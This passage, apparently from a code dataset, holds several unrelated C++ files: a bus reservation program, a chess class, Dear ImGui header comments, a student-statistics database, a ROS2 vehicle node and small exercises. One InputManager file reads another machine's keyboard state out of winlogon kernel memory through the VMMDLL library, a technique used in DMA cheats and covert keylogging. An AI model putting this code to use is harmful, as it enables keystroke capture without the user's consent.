\";\n\n  cin>>bus[p].busn;\n\n  cout<<\"\\nEnter Driver's name: \";\n\n  cin>>bus[p].driver;\n\n  cout<<\"\\nArrival time : \";\n\n  cin>>bus[p].arrival;\n\n  cout<<\"\\nDeparture: \";\n\n  cin>>bus[p].depart;\n\n  cout<<\"\\nFrom: \";\n\n  cin>>bus[p].from;\n\n  cout<<\"\\nTo: \";\n\n  cin>>bus[p].to;\n\n  bus[p].empty(); // Fill all the seats with 'empty'\n\n  p++; //Number of buses(index of array bus) increase\n\n}\n\n\nvoid a::allotmentOfSeatToPassenger()\n\n{\n\n  int seat;\n\n  char number[5];//Bus number in which you want to reserve seat\n\n  string a,g;\n\n  top:\n\n  cout<<\"Bus no: \";\n\n  cin>>number;\n\n  int n;\n\n  for(n=0;n<=p;n++)\n\n  {\n\n    if(strcmp(bus[n].busn, number)==0) //Check if bus number exist or not, if exist n will be the index of array bus\n\n    break;\n\n  }\n\n  while(n<=p)\n\n  {\n\n    cout<<\"\\nSeat Number: \";\n\n    cin>>seat;\n\n    if(seat>32) //Can't allocate as there are only 32 seats\n    {\n\n      cout<<\"\\nThere are only 32 seats available in this bus.\";\n\n    }\n\n    else\n\n    {\n\n    if (strcmp(bus[n].seat[seat/4][(seat%4)-1], \"Empty\")==0) // used to break the seat number in row-column basis, If empty then allocate passenger\n\n      {\n\n        cout<<\"Enter passanger's name, age and gender : \";\n\n        cin>>bus[n].seat[seat/4][(seat%4)-1]>>a>>g;\n\n        break;\n\n      }\n\n    else\n\n      cout<<\"The seat number is already reserved.\\n\";\n\n      }\n\n      }\n\n    if(n>p)\n\n    {\n\n      cout<<\"Enter correct bus no.\\n\";\n\n      goto top;\n\n    }\n\n  }\n\n\nvoid a::empty()\n\n{\n\n  for(int i=0; i<8;i++)\n\n  {\n\n    for(int j=0;j<4;j++)\n\n    {\n\n      strcpy(bus[p].seat[i][j], \"Empty\");\n\n    }\n\n  }\n\n}\n\n\n\nvoid a::showAvailableBusSeats()\n\n{\n\n  int n;\n\n  char number[5];\n\n  cout<<\"Enter bus no: \";\n\n  cin>>number;\n\n//Finds the bus number matched with input bus number\n  for(n=0;n<=p;n++)\n\n  {\n\n    if(strcmp(bus[n].busn, number)==0) // if matched the n will be the index of bus\n\n    break;\n\n  }\n\nwhile(n<=p)\n\n{\n\n  vline('*');\n  cout<<\"\\nBus no: \\t\"<<bus[n].busn\n\n  <<\"\\nDriver: \\t\"<<bus[n].driver<<\"\\t\\t\\t\\t\\tArrival time: \\t\"\n\n  <<bus[n].arrival<<\"\\tDeparture time:\"<<bus[n].depart\n\n  <<\"\\nFrom: \\t\\t\"<<bus[n].from<<\"\\t\\t\\t\\t\\tTo: \\t\\t\"<<\n\n  bus[n].to<<\"\\n\";\n\n  vline('*');\n\n  bus[0].showReservedBusSeats(n); //Checks for reserved seats in the current bus( nth bus)\n\n  int a=1;\n\n  for (int i=0; i<8; i++)\n\n  {\n\n    for(int j=0;j<4;j++)\n\n    {\n\n      a++;\n\n      if(strcmp(bus[n].seat[i][j],\"Empty\")!=0)\n\n      cout<<\"\\nThe seat no \"<<(a-1)<<\" is reserved for \"<<bus[n].seat[i][j]<<\".\";\n\n    }\n\n  }\n\n  break;\n\n  }\n\n  if(n>p)\n\n    cout<<\"Enter correct bus no: \";\n\n}\n\n\nvoid a::showReservedBusSeats(int l)\n{\n\n  int s=0,h=0;\n\n  for (int i =0; i<8;i++)\n\n  {\n\n    cout<<\"\\n\";\n\n    for (int j = 0;j<4; j++)\n\n    {\n\n      s++;\n\n      if(strcmp(bus[l].seat[i][j], \"Empty\")==0)\n\n        {\n\n          cout.width(5);\n\n          cout.fill(' ');\n\n          cout<<s<<\".\";\n\n          cout.width(10);\n\n          cout.fill(' ');\n\n          cout<<bus[l].seat[i][j];\n\n          h++;\n\n        }\n\n        else\n\n        {\n\n        cout.width(5);\n\n        cout.fill(' ');\n\n        cout<<s<<\".\";\n\n        cout.width(10);\n\n        cout.fill(' ');\n\n        cout<<\"Reserved\";\n\n        }\n\n      }\n\n    }\n\n  cout<<\"\\n\\nThere are \"<<h<<\" seats empty in Bus No: \"<<bus[l].busn;\n\n  }\n\n\nvoid a::showAvailableBuses()\n\n{\n\n  for(int n=0;n<p;n++)\n\n  {\n\n    vline('*');\n\n    cout<<\"Bus no: \"<<bus[n].busn<<\"\\n\\nDriver: \"<<bus[n].driver\n\n    <<\"\\t\\t\\tArrival time: \"<<bus[n].arrival<<\"\\t\\tDeparture Time: \"\n\n    <<bus[n].depart<<\"\\n\\nFrom: \"<<bus[n].from<<\"\\t\\tTo: \"\n\n    <<bus[n].to<<\"\\n\";\n\n    vline('*');\n\n    vline('_');\n\n  }\n\n}\n\n\nint main()\n\n{\n\n\n  int choice;\n  vline('-');\n  cout<<\"\\t\\t\\t\\t****SRM Bus Reservation System****\"<<endl<<endl;\n  vline('-');\n  while(1)\n  {\n\n\n\n  cout<<endl;\n  vline('*');\n  cout<<\"\\n\\n\";\n\n  cout<<\"\\t\\t\\t1.Add new Bus Details:\\n\\t\\t\\t\"\n\n  <<\"2.Reserve your seats:\\n\\t\\t\\t\"\n\n  <<\"3.Show the available seats in a bus:\\n\\t\\t\\t\"\n\n  <<\"4.Buses Available Now: \\n\\t\\t\\t\"\n\n  <<\"5.Exit\";\n  cout<<endl;\n  vline('*');\n  cout<<\"\\n\\t\\t\\tEnter your choice:-> \";\n\n  cin>>choice;\n  vline('*');\n\n  switch(choice)\n\n  {\n\n    case 1",
    "/*\n  ==============================================================================\n\n\tClass:          Player\n\n\tDescription:    Stats and settings for the player\n\n  ==============================================================================\n*/\n\n\n#include \"Player.h\"\n\n\nPlayer::Player()\n{\n}\n\n\nPlayer::Player(PlayerColor color) : mPlayerColor(color)\n{\n}\n\n\nPlayer::~Player()\n{\n}\n\n\nbool Player::isOnTurn() const\n{\n\treturn mIsCurrentTurn;\n}\n\n\nvoid Player::setOnTurn(bool value)\n{\n\tif (mIsCurrentTurn != value)\n\t{\n\t\tmIsCurrentTurn = value;\n\t}\n}\n\n\nint Player::getScore() const\n{\n\treturn mScore;\n}\n\n\nvoid Player::setScore(int value)\n{\n\tif (mScore != value)\n\t{\n\t\tmScore = value;\n\t}\n}\n\n\nPlayerColor Player::getPlayerColor() const\n{\n\treturn mPlayerColor;\n}\n\n\nvoid Player::setPlayerColor(PlayerColor value)\n{\n\tif (mPlayerColor != value)\n\t{\n\t\tmPlayerColor = value;\n\t}\n}\n\n\nvoid Player::addCapturedPiece(const PieceType piece)\n{\n\tmCapturedPieces.push_back(piece);\n}\n\n\nvoid Player::updateScore()\n{\n\tint score = 0;\n\tfor (auto piece : mCapturedPieces)\n\t{\n\t\tscore += getPieceValue(piece);\n\t}\n\tsetScore(score);\n}\n\n\nconstexpr int Player::getPieceValue(PieceType piece)\n{\n\tswitch (piece)\n\t{\n\tcase PieceType::Pawn: return pawnValue;\n\tcase PieceType::Knight: return knightValue;\n\tcase PieceType::Bishop: return bishopValue;\n\tcase PieceType::Rook: return rookValue;\n\tcase PieceType::Queen: return queenValue;\n\tcase PieceType::King: return kingValue;\n\tdefault: return 0;\n\t}\n}\n\n\nvoid Player::reset()\n{\n\tsetScore(0);\n\tmCapturedPieces.clear();\n\tsetOnTurn(false);\n}\n",
    "// dear imgui, v1.91.2 WIP\n// (main code and documentation)\n\n// Help:\n// - See links below.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Read top of imgui.cpp for more details, links and comments.\n\n// Resources:\n// - FAQ ........................ https://dearimgui.com/faq (in repository as docs/FAQ.md)\n// - Homepage ................... https://github.com/ocornut/imgui\n// - Releases & changelog ....... https://github.com/ocornut/imgui/releases\n// - Gallery .................... https://github.com/ocornut/imgui/issues?q=label%3Agallery (please post your screenshots/video there!)\n// - Wiki ....................... https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n//   - Getting Started            https://github.com/ocornut/imgui/wiki/Getting-Started (how to integrate in an existing app by adding ~25 lines of code)\n//   - Third-party Extensions     https://github.com/ocornut/imgui/wiki/Useful-Extensions (ImPlot & many more)\n//   - Bindings/Backends          https://github.com/ocornut/imgui/wiki/Bindings (language bindings, backends for various tech/engines)\n//   - Glossary                   https://github.com/ocornut/imgui/wiki/Glossary\n//   - Debug Tools                https://github.com/ocornut/imgui/wiki/Debug-Tools\n//   - Software using Dear ImGui  https://github.com/ocornut/imgui/wiki/Software-using-dear-imgui\n// - Issues & support ........... https://github.com/ocornut/imgui/issues\n// - Test Engine & Automation ... https://github.com/ocornut/imgui_test_engine (test suite, test engine to automate your apps)\n\n// For first-time users having issues compiling/linking/running/loading fonts:\n// please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n// Everything else should be asked in 'Issues'! We are building a database of cross-linked knowledge there.\n\n// Copyright (c) 2014-2024 Omar Cornut\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via B2B invoiced technical support, maintenance and sponsoring contracts.\n// PLEASE reach out at omar AT dearimgui DOT com. See https://github.com/ocornut/imgui/wiki/Funding\n// Businesses: you can also purchase licenses for the Dear ImGui Automation/Test Engine.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO, ImGuiPlatformIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ID STACK\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] ITEM SUBMISSION\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, ID STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUM",
    "#include \"Database.hpp\"\n#include <limits>\n#include <iomanip>\n\nusing std::ifstream;\nusing std::cout;\nusing std::endl;\nusing std::stringstream;\nusing std::stoul;\n\n\nDatabase::~Database()\n{\n  for (const Major* major : majors_)\n  {\n    delete major;\n  }\n};\n\n\nunsigned Database::parseNumberString(const string& number_string)\n{\n  unsigned long ul_int{ stoul(number_string) };\n  if (std::numeric_limits<unsigned>::max() < ul_int)\n  {\n    cout << \"Something bad happened :(\" << endl;\n    return std::numeric_limits<unsigned>::max();\n  }\n  unsigned u_int = stoul(number_string);\n  return u_int;\n}\n\n\nvoid Database::parseFile(const string& filename)\n{\n  ifstream data(filename);\n  string line;\n  if (!data.is_open())\n  {\n    throw std::invalid_argument(\"No file of this name exists.\");\n  }\n  getline(data, line); // read away first line\n  while (!data.eof())\n  {\n    getline(data, line);\n    stringstream str(line);\n    string string_to_num;\n\n    string major_id;\n    string major_name;\n    getline(str, major_id, ',');\n    getline(str, major_name, ',');\n\n    string number_as_string;\n    getline(str, number_as_string, ',');\n    unsigned women_dom{ parseNumberString(number_as_string) };\n    getline(str, number_as_string, ',');\n    unsigned men_dom{ parseNumberString(number_as_string) };\n    getline(str, number_as_string, ',');\n    unsigned women_int{ parseNumberString(number_as_string) };\n    getline(str, number_as_string, ',');\n    unsigned men_int{ parseNumberString(number_as_string) };\n    getline(str, number_as_string, ',');\n    unsigned total{ parseNumberString(number_as_string) };\n\n    majors_.push_back(new Major{ major_id, major_name, women_dom, men_dom, women_int, men_int, total });\n  }\n  data.close();\n}\n\n\nconst Major& Database::maxNumber(STUDENT_GROUP group, unsigned min_n_students=0) const\n{\n  const Major* max{ nullptr };\n  for (const Major* major : majors_)\n  {\n    if (major->numberOfStudents(STUDENT_GROUP::TOTAL) < min_n_students)\n    {\n      continue; // only majors with at least min_n_students students are considered\n    }\n    if (!max || (major->numberOfStudents(group) > max->numberOfStudents(group)))\n    {\n      max = major;\n    }\n  }\n  return *max; // what happens if there were no majors in the `majors_` attribute?\n}\n\n\nconst Major& Database::maxRatio(STUDENT_GROUP group, unsigned min_n_students=0) const\n{\n  const Major* max{ nullptr };\n  for (const Major* major : majors_)\n  {\n    if (major->numberOfStudents(STUDENT_GROUP::TOTAL) < min_n_students)\n    {\n      continue; // only majors with at least min_n_students students are considered\n    }\n    if (!max || (major->ratioOfStudents(group) > max->ratioOfStudents(group)))\n    {\n      max = major;\n    }\n  }\n  return *max; // what happens if there were no majors in the `majors_` attribute?\n}\n\n\nvoid Database::majorWithMostStudents()\n{\n  const Major& major = maxNumber(STUDENT_GROUP::TOTAL);\n  \n  cout << \"Das Studium mit den meisten Studierenden an der TU Graz ist \" << major.getName()\n    << \" mit \" << major.numberOfStudents(STUDENT_GROUP::TOTAL) << \" Studierenden.\" << endl;\n}\n\n\nvoid Database::majorWithMostFemaleStudents()\n{\n  const Major& major = maxNumber(STUDENT_GROUP::WOMEN_TOTAL);\n\n  cout << \"Das Studium mit den meisten Studentinnen an der TU Graz ist \" << major.getName()\n    << \" mit \" << major.numberOfStudents(STUDENT_GROUP::WOMEN_TOTAL) << \" Studentinnen.\" << endl;\n}\n\n\nvoid Database::majorWithLowestFemaleMaleRatio(unsigned min_n_students) // only majors with at least min_n_students students are considered\n{ \n  const Major& major = maxRatio(STUDENT_GROUP::MEN_TOTAL, min_n_students);\n\n  cout << \"Unter allen Studien an der TU Graz, die von mindestens \" << min_n_students\n    << \" Studierenden studiert werden, ist \" << major.getName() << \" jenes mit dem geringsten Frauenanteil (\"\n    << std::fixed << std::setprecision(1) << major.ratioOfStudents(STUDENT_GROUP::WOMEN_TOTAL) * 100\n    << \" %).\" << endl;\n}\n\n\nvoid Database::majorWithHighestFemaleMaleRatio(unsigned min_n_students)\n{\n  const Major& major = maxRatio(STUDENT_GROUP::WOMEN_TOTAL, min_n_students);\n\n  cout << \"Unter allen Studien an der TU Graz, die von mindestens \" << min_n_students\n    << \" Studierenden studiert werden, ist \" << major.getName() << \" jenes mit dem hoechsten Frauenanteil (\"\n    << std::fixed << std::setprecision(1) << major.ratioOfStudents(STUDENT_GROUP::WOMEN_TOTAL) * 100\n    << \" %).\" << endl;\n}\n\n\nvoid Database::majorWithHighestInternationalRatio(unsigned min_n_students)\n{\n  const Major& major = maxRatio(STUDENT_GROUP::INT_TOTAL, min_n_students);\n\n  cout << \"Unter allen Studien an der TU Graz, die von mindestens \" << min_n_students\n    << \" Studierenden studiert werden, ist \" << major.getName()\n    << \" jenes mit dem hoechsten Anteil an internationalen Studierenden (\"\n    << std::fixed << std::setprecision(1) << major.ratioOfStudents(STUDENT_GROUP::INT_TOTAL) * 100\n    << \" %).\" << endl;\n}\n",
    "#include <chrono>\n#include <functional>\n#include <memory>\n#include <string>\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"nav_msgs/msg/occupancy_grid.hpp\"\n#include \"multi_truck_scenario/msg/vehicle_base_data.hpp\"\n#include \"multi_truck_scenario/msg/s2_solution.hpp\"\n\nusing namespace std::chrono_literals;\nnamespace mts_msgs = multi_truck_scenario::msg;\n\nenum Indicator { off, left, right, warning };\nenum Engine { engine_on, engine_off };\n\nclass Vehicle : public rclcpp::Node\n{\npublic:\n    Vehicle() : rclcpp::Node(\"vehicle\")\n    {\n        handle_parameters();\n        // Publisher der die Daten der Instanz ver\u00f6ffentlicht\n        m_vehicle_pub = this->create_publisher<mts_msgs::VehicleBaseData>(\"vehicle_base_data\", 10);\n\n        m_solution_pub = this->create_publisher<mts_msgs::S2Solution>(\"s2_solution\", 10);\n\n        // Subscriber der die Werte der anderen Fahrzeuge empf\u00e4ngt\n        m_vehicle_sub = this->create_subscription<mts_msgs::VehicleBaseData>(\n            \"vehicle_base_data\", 10, std::bind(&Vehicle::vehicle_position_callback, this, std::placeholders::_1)\n        );\n\n        // Timer, der die Position alle 100 ms ver\u00f6ffentlicht\n        m_timer = this->create_wall_timer(\n            100ms, std::bind(&Vehicle::publish_vehicle, this)\n        );\n    }\n\n    void handle_parameters()\n    {\n        this->declare_parameter(\"position_x\", 0.0);\n        this->declare_parameter(\"position_y\", 0.0);\n        this->declare_parameter(\"position_z\", 0.0);\n        this->declare_parameter(\"direction\", 0.0);\n        this->declare_parameter(\"vin\", 0);\n        this->declare_parameter(\"speed\", 0.0);\n        this->declare_parameter(\"indicator_state\", 0);\n        this->declare_parameter(\"engine_state\", 0);\n        \n        m_position.point.x = this->get_parameter(\"position_x\").as_double();\n        m_position.point.y = this->get_parameter(\"position_y\").as_double();\n        m_position.point.z = this->get_parameter(\"position_z\").as_double();\n\n        m_direction = this->get_parameter(\"direction\").as_double();\n\n        m_vin = this->get_parameter(\"vin\").as_int();\n        m_speed = this->get_parameter(\"speed\").as_double();\n        m_indicator_state = (Indicator)this->get_parameter(\"indicator_state\").as_int();\n        m_engine_state = (Engine)this->get_parameter(\"engine_state\").as_int();\n    }\n\n    void set_position(geometry_msgs::msg::PointStamped point)\n    {\n        m_position = point;\n        m_position.header.stamp = rclcpp::Clock().now();\n    }\n\n    void set_speed(double speed)\n    {\n        m_speed = speed;\n    }\n\n    void set_direction(double direction)\n    {\n        m_direction = direction;\n    }\n\n    void set_vin(int vin)\n    {\n        m_vin = vin;\n    }\n    \nprivate:\n    void publish_vehicle()\n    {\n        // Ver\u00f6ffentlichen der aktuellen Position\n        // RCLCPP_INFO(this->get_logger(), \"Aktuelle Position: (%.2f, %.2f, %.2f)\", m_position.x, m_position.y, m_position.z);\n        m_position.header.stamp = rclcpp::Clock().now();\n\n        // build the base data package \n        auto vehicle_base_data = mts_msgs::VehicleBaseData();\n        vehicle_base_data.engine_state = m_engine_state;\n        vehicle_base_data.position = m_position;\n        vehicle_base_data.direction = m_direction;\n        vehicle_base_data.speed = m_speed;\n        vehicle_base_data.vin = m_vin;\n        vehicle_base_data.indicator_state = m_indicator_state;\n\n        m_vehicle_pub->publish(vehicle_base_data);\n    }\n\n    void solve_scenario_s2()\n    {\n        int winner_vin = -1;\n\n        for (const auto& v1 : m_vehicles)\n        {\n            double angle = v1.second->direction; // 0, 90, 180, 270\n            int count = 0;\n\n            for (const auto& v2 : m_vehicles)\n            {\n                if (v1 == v2) continue;\n\n                double wanted_angle = angle == 270.0 ? 0.0 : angle + 90.0;\n\n                // is there a car to the right? Then v1 can't be the winner \n                if (wanted_angle == v2.second->direction) break;\n\n                count++;\n            }\n\n            // if all cars are not \"right\" than this one has to drive\n            if (static_cast<size_t>(count) == m_vehicles.size() - 1)\n            {\n                winner_vin = v1.second->vin;\n            }\n        }\n\n        auto solution = mts_msgs::S2Solution();\n        solution.header.stamp = rclcpp::Clock().now();\n        solution.author_vin = m_vin;\n        solution.winner_vin = winner_vin;\n        \n        m_solution_pub->publish(solution);\n    }\n\n\n    void vehicle_position_callback(const mts_msgs::VehicleBaseData::SharedPtr vehicle_data)\n    {\n            /* this method shall do:\n                - read position & direction & indicator state & vin of up to 2 other vehicles\n            */\n            // Handle the received message\n            // RCLCPP_INFO(this->get_logger(), \"Vehicle Info: \\n\\t VIN: %d \\n\\t Position: \\n\\t\\t X: %.2f \\n\\t\\t Y: %.2f \\n\\t\\t Z: %.2f \\n\\t Direction: %.2f \\n\\t Speed: %.2f \\n\\t Indicator State: %d\", msg->vin, msg->position.point.x, msg->position.point.y, m",
    "/*\nMIT License\n\nCopyright (c) 2024 David Tamaratare Oghenebrume\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n*/\n\n#include <pybind11/pybind11.h>\n#include <string>\n\nnamespace brumski_cpp{\n\n  class Differential{\n  private:\n    int number = 0;\n    char variable;\n    int power = 0;\n\n  public:\n    Differential(const int& number, const char& variable, const int& power){\n      this->number = number;\n      this->variable = variable;\n      this->power = power;\n    }\n\n    std::string diff(){\n      std::string result;\n  \n      if(power != 2){\n        result = std::to_string(power * number) + \"\" + variable + \"^\" + std::to_string(power - 1);  \n      }\n      else{\n        result = std::to_string(power * number) + \"\" + variable;\n      }\n    \n      return result;\n    }\n  \n};\n\n}\n\nnamespace py = pybind11;\n\nPYBIND11_MODULE(derivatives, m){\n   py::class_<brumski_cpp::Differential>(m, \"Differential\")\n     .def(py::init<const int&, const char&, const int&>())\n     .def(\"diff\", &brumski_cpp::Differential::diff);\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nint main(){\r\n    int n;\r\n    cout<<\"Enter number of elements:\";\r\n    cin>>n;\r\n    \r\n    int arr[n];\r\n    \r\n    for(int i=0;i<n;i++){\r\n        cout<<\"Enter array Elements:\";\r\n        \r\n        cin>>arr[i];\r\n    }\r\n    cout<<endl;\r\n    for(int i=0;i<n;i++){\r\n        cout<<arr[i]<<\"\\t\";\r\n    }\r\n    \r\n    int el,newpos;\r\n    cout<<\"\\n\\nEnter element you want to search:\";\r\n    cin>>el;\r\n    for(int i=0;i<n;i++){\r\n        if(arr[i]==el){\r\n            newpos=i+1;\r\n            cout<<\"Element \"<<el<<\" is in position \"<<newpos;\r\n        }\r\n\r\n    }\r\n    int posel,wen;\r\n    cout<<\"\\n\\nEnter element position you want to update:\";\r\n    cin>>posel;\r\n    cout<<\"Enter the number:\";\r\n    cin>>wen;\r\n    \r\n    arr[posel-1]=wen;  \r\n    \r\n    for(int i=0;i<n;i++){\r\n        cout<<arr[i]<<\"\\t\";\r\n    }\r\n    int pos;\r\n    cout<<\"\\n\\nEnter element position you want to delete:\";\r\n    cin>>pos;\r\n    \r\n    for(int i=0;i<n;i++){\r\n        if(i==pos-1){\r\n            continue;\r\n        }\r\n        cout<<arr[i]<<\"\\t\";\r\n    }\r\n    \r\n\r\n        \r\n        \r\n    return 0;\r\n    \r\n\r\n}\r\n",
    "#include \"pch.h\"\n#include \"InputManager.h\"\n#include \"Registry.h\"\n#include \"Memory.h\"\n\nbool c_keys::InitKeyboard()\n{\n\tstd::string win = registry.QueryValue(\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\CurrentBuild\", e_registry_type::sz);\n\tint Winver = 0;\n\tif (!win.empty())\n\t\tWinver = std::stoi(win);\n\telse\n\t\treturn false;\n\n\tthis->win_logon_pid = mem.GetPidFromName(\"winlogon.exe\");\n\tif (Winver > 22000)\n\t{\n\t\tauto pids = mem.GetPidListFromName(\"csrss.exe\");\n\t\tfor (size_t i = 0; i < pids.size(); i++)\n\t\t{\n\t\t\tauto pid = pids[i];\n\t\t\tuintptr_t tmp = VMMDLL_ProcessGetModuleBaseU(mem.vHandle, pid, (LPSTR)\"win32ksgd.sys\");\n\t\t\tuintptr_t g_session_global_slots = tmp + 0x3110;\n\t\t\tuintptr_t user_session_state = mem.Read<uintptr_t>(mem.Read<uintptr_t>(mem.Read<uintptr_t>(g_session_global_slots, pid), pid), pid);\n\t\t\tgafAsyncKeyStateExport = user_session_state + 0x3690;\n\t\t\tif (gafAsyncKeyStateExport > 0x7FFFFFFFFFFF)\n\t\t\t\tbreak;\n\t\t}\n\t\tif (gafAsyncKeyStateExport > 0x7FFFFFFFFFFF)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\telse\n\t{\n\t\tPVMMDLL_MAP_EAT eat_map = NULL;\n\t\tPVMMDLL_MAP_EATENTRY eat_map_entry;\n\t\tbool result = VMMDLL_Map_GetEATU(mem.vHandle, mem.GetPidFromName(\"winlogon.exe\") | VMMDLL_PID_PROCESS_WITH_KERNELMEMORY, (LPSTR)\"win32kbase.sys\", &eat_map);\n\t\tif (!result)\n\t\t\treturn false;\n\n\t\tif (eat_map->dwVersion != VMMDLL_MAP_EAT_VERSION)\n\t\t{\n\t\t\tVMMDLL_MemFree(eat_map);\n\t\t\teat_map_entry = NULL;\n\t\t\treturn false;\n\t\t}\n\n\t\tfor (int i = 0; i < eat_map->cMap; i++)\n\t\t{\n\t\t\teat_map_entry = eat_map->pMap + i;\n\t\t\tif (strcmp(eat_map_entry->uszFunction, \"gafAsyncKeyState\") == 0)\n\t\t\t{\n\t\t\t\tgafAsyncKeyStateExport = eat_map_entry->vaFunction;\n\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tVMMDLL_MemFree(eat_map);\n\t\teat_map = NULL;\n\t\tif (gafAsyncKeyStateExport > 0x7FFFFFFFFFFF)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n}\n\nvoid c_keys::UpdateKeys()\n{\n\tuint8_t previous_key_state_bitmap[64] = { 0 };\n\tmemcpy(previous_key_state_bitmap, state_bitmap, 64);\n\n\tVMMDLL_MemReadEx(mem.vHandle, this->win_logon_pid | VMMDLL_PID_PROCESS_WITH_KERNELMEMORY, gafAsyncKeyStateExport, (PBYTE)&state_bitmap, 64, NULL, VMMDLL_FLAG_NOCACHE);\n\tfor (int vk = 0; vk < 256; ++vk)\n\t\tif ((state_bitmap[(vk * 2 / 8)] & 1 << vk % 4 * 2) && !(previous_key_state_bitmap[(vk * 2 / 8)] & 1 << vk % 4 * 2))\n\t\t\tprevious_state_bitmap[vk / 8] |= 1 << vk % 8;\n}\n\nbool c_keys::IsKeyDown(uint32_t virtual_key_code)\n{\n\tif (gafAsyncKeyStateExport < 0x7FFFFFFFFFFF)\n\t\treturn false;\n\tif (std::chrono::system_clock::now() - start > std::chrono::milliseconds(1))\n\t{\n\t\tUpdateKeys();\n\t\tstart = std::chrono::system_clock::now();\n\t}\n\treturn state_bitmap[(virtual_key_code * 2 / 8)] & 1 << virtual_key_code % 4 * 2;\n}",
    "#include \"CppUnitTest.h\"\n#include \"../Doubly Linked List/DList.h\"\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\nnamespace Microsoft {\n\tnamespace VisualStudio {\n\t\tnamespace CppUnitTestFramework\n\t\t{\n\t\t\ttemplate<> static std::wstring ToString<DListNode<int>>(const DListNode<int> &b)\n\t\t\t{\n\t\t\t\treturn L\"DListNode\";\n\t\t\t};\n\t\t}\n\t}\n}\nnamespace DoublyLinkedListTests\n{\t\t\n\tTEST_CLASS(DListNodeTest)\n\t{\n\tpublic:\n\t\t/*\n\t\t\tTest to ensure value is setted and next and previous are set to\n\t\t\tnull when constructor is called\n\t\t*/\n\t\t\t\n\n\t\tTEST_METHOD(TestConstructor)\n\t\t{\n\t\t\tDListNode<int> node(5);\n\t\t\tAssert::AreEqual(5, node.data);\n\t\t\tAssert::IsNull(node.next);\n\t\t\tAssert::IsNull(node.previous);\n\t\t}\n\n\t\t/*\n\t\t\tTest of insert after with a single node \n\t\t\tTests teh correct value is set and the correct links are established\n\t\t\tusing next and previous\n\n\t\t*/\n\t\tTEST_METHOD(TestInsertAfter)\n\t\t{\n\t\t\tDListNode<int> node(5);\n\t\t\tAssert::AreEqual(5, 